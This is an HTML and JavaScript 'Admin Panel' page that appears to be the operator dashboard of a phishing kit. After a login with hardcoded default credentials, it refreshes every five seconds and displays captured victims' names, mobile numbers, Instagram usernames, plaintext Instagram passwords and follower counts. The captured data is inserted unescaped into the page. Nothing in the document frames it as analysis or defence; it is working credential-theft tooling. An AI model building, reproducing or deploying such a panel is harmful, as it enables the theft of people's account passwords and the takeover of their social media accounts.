<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        body {
            background: #0a0a0f;
            color: #fff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: #1a1a2e;
            padding: 30px;
            border-radius: 16px;
            max-width: 1000px;
            width: 100%;
            border: 1px solid #333;
        }
        h1 {
            color: #f09433;
            margin-bottom: 20px;
            text-align: center;
        }
        .login-box {
            max-width: 400px;
            margin: 40px auto;
        }
        .login-box input {
            width: 100%;
            padding: 12px;
            margin-bottom: 12px;
            border-radius: 8px;
            border: 1px solid #333;
            background: #0a0a0f;
            color: #fff;
        }
        .login-box button {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            background: #f09433;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
        }
        .login-box button:hover {
            background: #dc2743;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            font-size: 14px;
        }
        th, td {
            padding: 10px;
            text-align: left;
            border-bottom: 1px solid #333;
        }
        th {
            background: #0a0a0f;
            color: #f09433;
        }
        td {
            color: #ccc;
        }
        .hidden {
            display: none;
        }
        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 10px;
        }
        .btn {
            padding: 8px 20px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
        }
        .btn-logout {
            background: #dc2743;
            color: #fff;
        }
        .btn-logout:hover {
            background: #bc1888;
        }
        .btn-refresh {
            background: #4ade80;
            color: #000;
        }
        .btn-refresh:hover {
            background: #22c55e;
        }
        .btn-back {
            background: #3b82f6;
            color: #fff;
        }
        .btn-back:hover {
            background: #2563eb;
        }
        .count {
            color: #aaa;
        }
        .status {
            color: #4ade80;
            margin-top: 10px;
            display: none;
        }
        .error {
            color: #dc2743;
            margin-top: 10px;
            display: none;
        }
        .live-badge {
            background: #dc2743;
            color: #fff;
            padding: 2px 12px;
            border-radius: 20px;
            font-size: 12px;
            display: inline-block;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 Admin Panel <span class="live-badge">● LIVE</span></h1>

        <div id="loginBox" class="login-box">
            <input type="text" id="adminUser" placeholder="Username" value="admin">
            <input type="password" id="adminPass" placeholder="Password" value="lisa123">
            <button onclick="login()">Login</button>
            <p id="loginError" class="error">Invalid credentials</p>
        </div>

        <div id="dashboard" class="hidden">
            <div class="top-bar">
                <div>
                    <span class="count">📊 Total: <span id="totalCount">0</span></span>
                </div>
                <div>
                    <button class="btn btn-back" onclick="window.location.href='/'">← Back</button>
                    <button class="btn btn-refresh" onclick="fetchData()">🔄 Refresh</button>
                    <button class="btn btn-logout" onclick="logout()">Logout</button>
                </div>
            </div>
            <p id="statusMsg" class="status">✅ Data loaded</p>
            <div style="overflow-x:auto;">
                <table>
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Timestamp</th>
                            <th>Name</th>
                            <th>Mobile</th>
                            <th>Instagram</th>
                            <th>Password</th>
                            <th>Followers</th>
                        </tr>
                    </thead>
                    <tbody id="dataBody">
                        <tr><td colspan="7" style="text-align:center;color:#666;">Loading...</td></tr>
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <script>
        let token = null;

        async function login() {
            const username = document.getElementById('adminUser').value;
            const password = document.getElementById('adminPass').value;
            const errorEl = document.getElementById('loginError');

            try {
                const res = await fetch('/api/admin/auth', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });
                const data = await res.json();
                if (data.success) {
                    token = data.token;
                    errorEl.style.display = 'none';
                    document.getElementById('loginBox').classList.add('hidden');
                    document.getElementById('dashboard').classList.remove('hidden');
                    document.getElementById('statusMsg').style.display = 'none';
                    fetchData();
                    // Auto-refresh every 5 seconds (real-time)
                    if (window._refreshInterval) clearInterval(window._refreshInterval);
                    window._refreshInterval = setInterval(() => {
                        if (token) fetchData();
                    }, 5000);
                } else {
                    errorEl.style.display = 'block';
                }
            } catch {
                errorEl.style.display = 'block';
            }
        }

        async function fetchData() {
            const statusEl = document.getElementById('statusMsg');
            try {
                const res = await fetch('/api/admin/data', {
                    headers: { 'Authorization': token }
                });
                if (res.status === 401) { 
                    logout(); 
                    return; 
                }
                const data = await res.json();
                console.log('📊 Data fetched:', data.submissions.length, 'records');
                
                document.getElementById('totalCount').textContent = data.submissions.length;
                const tbody = document.getElementById('dataBody');
                tbody.innerHTML = '';
                
                if (data.submissions.length === 0) {
                    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;color:#666;">No data yet</td></tr>';
                } else {
                    data.submissions.slice().reverse().forEach((item, index) => {
                        tbody.innerHTML += `<tr>
                            <td>${index + 1}</td>
                            <td>${item.timestamp}</td>
                            <td>${item.name}</td>
                            <td>${item.mobile}</td>
                            <td>${item.username}</td>
                            <td>${item.password}</td>
                            <td>${item.followers}</td>
                        </tr>`;
                    });
                }
                statusEl.textContent = '✅ Updated: ' + new Date().toLocaleTimeString();
                statusEl.style.display = 'block';
                statusEl.style.color = '#4ade80';
                setTimeout(() => { statusEl.style.display = 'none'; }, 2000);
            } catch (err) {
                console.error('Fetch error:', err);
                statusEl.textContent = '❌ Failed to load';
                statusEl.style.display = 'block';
                statusEl.style.color = '#dc2743';
            }
        }

        function logout() {
            if (window._refreshInterval) clearInterval(window._refreshInterval);
            token = null;
            document.getElementById('dashboard').classList.add('hidden');
            document.getElementById('loginBox').classList.remove('hidden');
            document.getElementById('loginError').style.display = 'none';
            document.getElementById('statusMsg').style.display = 'none';
        }
    </script>
</body>
</html>
